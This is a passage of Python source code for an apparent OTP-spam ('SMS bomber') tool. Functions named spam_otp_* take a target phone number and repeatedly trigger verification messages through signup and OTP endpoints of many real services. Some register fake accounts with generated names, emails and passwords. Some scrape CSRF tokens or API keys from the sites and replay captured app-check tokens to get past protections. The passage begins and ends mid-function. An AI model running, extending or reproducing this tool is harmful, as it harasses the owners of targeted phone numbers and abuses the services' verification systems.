            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://m.bantusaku.id',
            'referer': 'https://m.bantusaku.id/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-auth-token': 'null',
            'x-device-os': 'web',
            'x-merchant': 'BantuSaku',
            'x-token-sign': unique_code,
            'x-version': 'web-3.2.1'
        }

        payload = {
            'phone': nomor_lokal,
            'type': 'register',
            'imageCode': '',
            'merchantNo': 'BantuSaku',
            'uniquCode': unique_code
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_mengantar(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama = f'{random.choice(first)} {random.choice(last)}'
        email = f"{nama.lower().replace(' ', '')}{random.randint(10, 99)}@gmail.com"

        session = requests.Session()
        url = 'https://app.mengantar.com/api/auth/send-verification-code'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://app.mengantar.com',
            'referer': 'https://app.mengantar.com/id/register',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }

        payload = {
            'courier': 'JNE',
            'email': email,
            'language': 'id',
            'name': nama,
            'phone': nomor_lokal,
            'subject': 'register',
            'verificationType': 'whatsapp'
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_volta(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://voltaindonesia.com', 'referer': 'https://voltaindonesia.com/', 'sec-ch-ua': '\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '\"Android\"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://auth-production.voltaindonesia.com/v1/client/request-otp', json={'phoneNumber': nomor}, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_pluang(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor_lokal = '+' + nomor
        elif nomor.startswith('+62'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '+62' + nomor

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama = f'{random.choice(first)} {random.choice(last)}'
        email = f"{nama.lower().replace(' ', '')}{random.randint(10, 99)}@gmail.com"
        device_id = f"web-{str(uuid.uuid4())}"
        request_id = str(uuid.uuid4())

        session = requests.Session()
        url = 'https://api-pluang.pluang.com/api/v3/user/signup/phone'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://trade.pluang.com',
            'referer': 'https://trade.pluang.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-device-id': device_id,
            'x-language-code': 'id',
            'x-platform': 'desktop-web',
            'x-request-id': request_id
        }

        payload = {
            'name': nama,
            'email': email,
            'phone': nomor_lokal,
            'messageMedium': 'WHATSAPP_MESSAGE',
            'referral': '',
            'signature': '107216cfe6d1023ceeb94a5c63f498f6a126160345d4ad9b375daef34371ebfe'
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_youtap(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = 'https://bos-api.youtap.id/v1/graphql'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://bos.youtap.id',
            'referer': 'https://bos.youtap.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-content-type-options': 'nosniff',
            'x-platform-id': 'WEB',
            'x-timezone': 'Asia/Jakarta',
            'x-village-id': '7ceec169-6e16-11ec-a41a-9383440169c7'
        }

        # Step 1: Check phone
        payload1 = {
            'variables': {
                'checkPhoneInput': {
                    'phone': nomor_lokal,
                    'platformType': 'BOS_REGISTRATION'
                }
            },
            'query': 'mutation ($checkPhoneInput: CheckPhoneInput!) {\n checkPhone(checkPhoneInput: $checkPhoneInput) {\n merchantRegistration {\n id\n phone\n platformType\n otpExpiredAt\n }\n token\n }\n}'
        }

        resp1 = session.post(url, json=payload1, headers=headers, timeout=10)
        token = resp1.json().get('data', {}).get('checkPhone', {}).get('token')

        if token:
            # Step 2: Regenerate OTP
            headers['authorization'] = f'Bearer {token}'
            payload2 = {
                'variables': {},
                'query': 'mutation {\n regenerateOTP {\n otpExpiredAt\n }\n}'
            }
            resp2 = session.post(url, json=payload2, headers=headers, timeout=10)
            return resp2.status_code < 400
        else:
            return False

    except Exception as e:
        return False

def spam_otp_beautyhaul(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]
        session = requests.Session()
        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama_depan = random.choice(first)
        nama_belakang = random.choice(last)
        email = f'{nama_depan.lower()}{nama_belakang.lower()}{random.randint(10, 99)}@gmail.com'
        password = spam_otp_codex(10) + str(random.randint(10, 99))
        tgl = f"{random.randint(1, 28)} {random.choice(['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'])} {random.randint(1985, 2000)}"
        headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.beautyhaul.com', 'referer': 'https://www.beautyhaul.com/account/register', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        session.get('https://www.beautyhaul.com/account/register', headers={'user-agent': headers['user-agent']}, timeout=10)
        resp_reg = session.post('https://www.beautyhaul.com/ajax/account/save_register', json={'nama_depan': nama_depan, 'nama_belakang': nama_belakang, 'email': email, 'g-recaptcha-response': '', 'jenis_kelamin': random.choice(['Male', 'Female']), 'konfirmasi_password': password, 'nomor_kode_id': '100', 'nomor_kode_value': '62', 'nomor_ponsel': nomor, 'password': password, 'subscribe': 'true', 'tanggal_lahir': tgl, 'terms': 'true'}, headers=headers, timeout=10)
        if resp_reg.status_code != 200:
            return False
        resp = session.post('https://www.beautyhaul.com/ajax/account/send_otp', json={'method': 'WhatsApp'}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_byu(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        url = 'https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp'

        headers = {
            'accept': 'application/json',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ3NDk2NzQiLCJhcCI6IjExMjA0MzgyNjEiLCJpZCI6IjBhZmM0ODY2ZDY3MWU5MzM3OTk3YWUxY2M5ZDEwMzI1NTQ1ZWM1YmVhMzkzMzVjIiwidHIiOiIwYWZjNDg2NmQ2NzFlOTMzNzk5N2FlMWNjOWQxMDMyNTU0NWVjNWJlYTM5MzM1YyIsImZlIjoiMTc3NzYwNzYzODUyOCIsInByIjoiMS40NzQ5MTc0LTExMjA0MzgyNjEtNTU0NWVjNWJlYTM5MzM1Yy0tMTc3NzYwNzYzODUyOCIsInR0IjoxLCJ0ayI6IjE4NjM1MTkiLCJzIjoiMDEifX0=',
            'origin': 'https://pidaw-webfront.cx.byu.id',
            'referer': 'https://pidaw-webfront.cx.byu.id/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'slocation': 'CL',
            'traceparent': '00-0afcc4866d671e9337997ae1cc9d1032-5545ec5bea39335c-01',
            'tracestate': '1863519@nr=0-1-4749174-1120438261-5545ec5bea39335c----1777607638528',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-deviceid': '17776076111271930882471',
            'x-request-id': 'a33150a0-87cd-48ea-89ad-7314024949aa'
        }

        payload = {
            'identifier': nomor_lokal,
            'channel': 'web'
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_astradaihatsu2(nomor):
    try:
        if nomor.startswith('0'):
            nomor_intl = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_intl = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_intl = '62' + nomor
        else:
            nomor_intl = nomor

        session = requests.Session()
        r1 = session.get('https://www.astra-daihatsu.id/register', 
            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )

        import re
        csrf = re.search('name="CSRFToken" value="([^"]+)"', r1.text)
        if csrf:
            csrf_token = csrf.group(1)
            url = 'https://www.astra-daihatsu.id/otp/whatsapp/generate'
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/json; charset=UTF-8',
                'csrftoken': csrf_token,
                'origin': 'https://www.astra-daihatsu.id',
                'referer': 'https://www.astra-daihatsu.id/register',
                'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest'
            }
            payload = {'phoneNo': nomor_intl}
            r2 = session.post(url, json=payload, headers=headers, timeout=10)
            return r2.status_code < 400
        else:
            return False

    except Exception as e:
        return False

def spam_otp_astradaihatsu_sms(nomor):
    try:
        if nomor.startswith('0'):
            nomor_intl = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_intl = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_intl = '62' + nomor
        else:
            nomor_intl = nomor

        session = requests.Session()
        r1 = session.get('https://www.astra-daihatsu.id/register', 
            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )

        import re
        csrf = re.search('name="CSRFToken" value="([^"]+)"', r1.text)
        if csrf:
            csrf_token = csrf.group(1)
            url = 'https://www.astra-daihatsu.id/otp/sms/generate'
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/json; charset=UTF-8',
                'csrftoken': csrf_token,
                'origin': 'https://www.astra-daihatsu.id',
                'referer': 'https://www.astra-daihatsu.id/register',
                'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest'
            }
            payload = {'phoneNo': nomor_intl}
            r2 = session.post(url, json=payload, headers=headers, timeout=10)
            return r2.status_code < 400
        else:
            return False

    except Exception as e:
        return False

def spam_otp_vedantu(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]

        session = requests.Session()

        url_login = 'https://user.vedantu.com/user/login/auth'
        headers_login = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.vedantu.com',
            'referer': 'https://www.vedantu.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }
        payload_login = {"ver": 12.269}

        resp_login = session.post(url_login, json=payload_login, headers=headers_login, timeout=10)

        if resp_login.status_code != 200:
            return False

        url_otp = 'https://user.vedantu.com/user/resendPreLoginVerificationOTP'
        headers_otp = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.vedantu.com',
            'referer': 'https://www.vedantu.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }
        payload_otp = {
            "email": None,
            "phoneCode": 62,
            "phoneNumber": nomor,
            "version": 2,
            "sType": "VEDANTU_F_7_N",
            "sValue": "FC34EE3DD29934CD6723BA8151D3E"
        }

        resp_otp = session.post(url_otp, json=payload_otp, headers=headers_otp, timeout=10)

        if resp_otp.status_code == 200:
            try:
                data = resp_otp.json()
                if data.get('status') == 'SUCCESS' or data.get('success') == True:
                    return True
                else:
                    return True
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_viuum(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = 'https://api.viuum.co.id/api_viuum/v1/customer/one-time-phone'

        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://wearviuum.com',
            'referer': 'https://wearviuum.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        payload = {'number': nomor_lokal}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_onebunda(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://cms.bunda.co.id/api/v1/auth/send-otp' \\
  -H 'host: cms.bunda.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-firebase-appcheck: eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjU5NjU2Mzg5ODEwMzp3ZWI6Y2VmNTMwYWNmYjgzZGY4NDdhZWRmMiIsImF1ZCI6WyJwcm9qZWN0cy81OTY1NjM4OTgxMDMiLCJwcm9qZWN0cy9ibWhzLXdlYi1hcHBzIl0sInByb3ZpZGVyIjoicmVjYXB0Y2hhX3YzIiwiaXNzIjoiaHR0cHM6Ly9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tLzU5NjU2Mzg5ODEwMyIsImV4cCI6MTc4NzIzNzQ1MCwiaWF0IjoxNzg3MTUxMDUwLCJqdGkiOiJ4YUEydzFUWnpxVHgtU2NHOGVQUGRqRkV3OHRVWUZhdXhfa3ExckthNVpBIn0.0GtUrReLPvBzyUZSeojw_D4CQfRcIhYS4kwTpuwMmbpQ8VquBJUyaEcSl28Rpq0_LrEcRkz-nHrAHtD2V-trDLQYzXIq2rC-JYWm3YadIDgh3FQ_nWrzdUUHfDLwCpgUU0QdopTXt1IkqEVK29vHjndK-s4yADZtVkV61DNzUKQKqCwcEH2Imw9q7GFEo19EhIYLIVd06Zdvit_GnPr93zYtuwzuIMPXcOghmqzsgER0vec2JQAr7oIc7Za47y_MNhtfJ5duSoDDb0MzyHaMJ0xX_-s6WIWT8gUI2uCwW2asUALRSouydvlOgMGpBkcZHAThBLYJ3k11iNEUUV-nwVb15PUjLM6y3XRHWXwEZ_1WAVy3GDFk-mxnGY8ez2X1xX64JJSVJMMqbwl_V0XccWPtlYEBP3MvmpgVl33lF6Pb9ZMaVAVv2C2h_8V6ik0rhsequDyDgd1as20UUagHfZEUIJCiMhktSc2yykuoGiXVTasq5dROxcQgEwPYN66x' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'x-locale: id' \\
  -H 'origin: https://www.bunda.co.id' \\
  -H 'sec-fetch-site: same-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.bunda.co.id/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{{"phone_number":{phone},"type":"auth"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_ibudanbalita(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        session = requests.Session()
        first = ['Siti', 'Dewi', 'Rina', 'Maya', 'Fitri', 'Ani', 'Yuni', 'Rini', 'Lina', 'Nita']
        last = ['Rahayu', 'Santoso', 'Wijaya', 'Kusuma', 'Pratama', 'Sari', 'Putri', 'Wati', 'Hidayat', 'Lestari']
        nama = f'{random.choice(first)} {random.choice(last)}'
        chars = string.ascii_letters + string.digits + '!@#$%^&*'
        password = ''.join(random.choices(chars, k=12))
        ua = 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36'
        resp_page = session.get('https://www.ibudanbalita.com/poinprimagro/tabung-poin', headers={'user-agent': ua}, timeout=10)
        import re
        token_match = re.search(r'_token["\s]+content=["\s]*([^">\s]+)', resp_page.text)
        if not token_match:
            return False
        token = token_match.group(1)
        headers = {'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.ibudanbalita.com', 'user-agent': ua, 'x-csrf-token': token, 'x-requested-with': 'XMLHttpRequest'}
        data = {'full_name': nama, 'maternal_status': 'mother', 'due_date': '', 'dob': '', 'mobile': nomor_lokal, 'email': '', 'password': password, 'scregakp': '', 'children[full_name]': f'Anak {random.choice(first)}', 'children[dob]': f'202{random.randint(2,4)}-{str(random.randint(1,12)).zfill(2)}-{str(random.randint(1,28)).zfill(2)}', 'redirect': 'https://www.ibudanbalita.com/ebook', 'local_storage': 'none'}
        resp = session.post('https://www.ibudanbalita.com/aitindo/registration/register', data=data, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_swiggy(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]

        import random
        import string

        nama = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 10))).capitalize()

        session = requests.Session()

        headers_get = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        session.get('https://www.swiggy.com/auth', headers=headers_get, timeout=10)

        headers_post = {
            'accept': '*/*',
            '__fetch_req__': 'true',
            'content-type': 'application/json',
            'origin': 'https://www.swiggy.com',
            'platform': 'mweb',
            'referer': 'https://www.swiggy.com/auth/register',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'user-id': '0',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        payload = {
            'name': nama,
            'email': '',
            'mobile': nomor,
            'password': '',
            'referral_code': '',
            'countryCode': '62',
            'countryKey': 'IN'
        }

        resp = session.post('https://www.swiggy.com/mapi/auth/signup', 
                           json=payload, 
                           headers=headers_post, 
                           timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                is_success = data.get('data', {}).get('is_success', False)
                if is_success:
                    return True
                return False
            except:
                return True if resp.status_code == 200 else False
        else:
            return False

    except Exception as e:
        return False

def spam_otp_cilory(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor[1:]
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = 'https://www.cilory.com/app/w/auth/soft'

        headers = {
            'accept': 'application/json',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.cilory.com',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            'mobile': nomor_lokal,
            'country_code': '+62'
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_naturalfarm(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        js_resp = session.get('https://www.naturalfarm.id/_nuxt/401b963.js', 
            headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )

        import re
        key_match = re.search('dZp91nhRNg6u[^"]*', js_resp.text)
        if not key_match:
            return False

        api_key = key_match.group(0)

        wilayah = [
            {'province': 1, 'city': 161, 'subdistrict': 2236, 'label': 'Bali, Jembrana, Pekutatan'},
            {'province': 32, 'city': 322, 'subdistrict': 4569, 'label': 'Sumatera Barat, Padang Pariaman, 2 X 11 Kayu Tanam'}
        ]
        w = random.choice(wilayah)
        address_id = f"{w['province']}_{w['city']}_{w['subdistrict']}"

        first_names = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last_names = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra']
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f'{first_name.lower()}{last_name.lower()}{random.randint(10, 99)}@gmail.com'
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + str(random.randint(100, 999))
        year = random.randint(1985, 2000)
        month = random.randint(1, 12)
        day = random.randint(1, 28)
        birthdate = f'{year}-{str(month).zfill(2)}-{str(day).zfill(2)}'
        gender = random.choice([1, 2])
        streets = ['JL.Merdeka', 'JL.Sudirman', 'JL.Gatot Subroto', 'JL.Ahmad Yani', 'JL.Diponegoro']
        street = f'{random.choice(streets)} No. {random.randint(1, 100)}'

        url = 'https://api.naturalfarm.id/api/appv1-1/register/phone'
        headers = {
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=86400',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Host': 'api.naturalfarm.id',
            'key': api_key,
            'Origin': 'https://www.naturalfarm.id',
            'Referer': 'https://www.naturalfarm.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            'first_name': first_name,
            'last_name': last_name,
            'email': email,
            'phone': nomor_lokal,
            'password': password,
            'birthdate': birthdate,
            'gender': gender,
            'platform': 1,
            'province': w['province'],
            'city': w['city'],
            'subdistrict': w['subdistrict'],
            'address_id': address_id,
            'label': w['label'],
            'street': street,
            'referral_code': '',
            'card_code': None
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False


def spam_otp_gritero(nomor):
    try:
        if not nomor.startswith('62'):
            nomor_lokal = '62' + nomor.lstrip('0')
        else:
            nomor_lokal = nomor

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fitri', 'Gita', 'Hadi', 'Indah', 'Joko']
